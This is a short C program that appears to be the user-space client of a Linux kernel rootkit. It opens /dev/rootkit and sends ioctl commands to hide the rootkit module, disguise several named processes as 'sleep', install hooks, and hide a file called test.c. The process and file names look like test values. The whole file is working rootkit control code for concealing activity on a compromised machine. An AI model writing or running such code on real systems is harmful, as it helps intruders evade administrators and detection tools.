#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include "rootkit.h"

int main(void) {

	int fd;

	fd = open("/dev/rootkit", O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "failed to open /dev/rootkit: %s\n", strerror(errno));
		exit(-1);
	}

	if (ioctl(fd, IOCTL_MOD_HIDE) < 0) {
		fprintf(stderr, "ioctl failed\n");
		exit(-1);
	}

	struct masq_proc masq[] = {
		{ "hello", 		"sleep" },
		{ "longlong", 	"sleep" },
		{ "aa", 	"sleep" },
		{ "longlonglong", 	"sleep" },
	};
	struct masq_proc_req req = {
		.len = sizeof(masq) / sizeof(struct masq_proc),
		.list = masq,
	};
	if (ioctl(fd, IOCTL_MOD_MASQ, &req) < 0) {
		fprintf(stderr, "ioctl masq failed\n");
		exit(-1);
	}

	if (ioctl(fd, IOCTL_MOD_HOOK) < 0) {
		fprintf(stderr, "ioctl hook failed\n");
		exit(-1);
	}

	struct hided_file hide = {
		.len = 6,
		.name = "test.c",
	};

	if (ioctl(fd, IOCTL_FILE_HIDE, &hide) < 0) {
		fprintf(stderr, "ioctl file hide failed\n");
		exit(-1);
	}

	return 0;
}
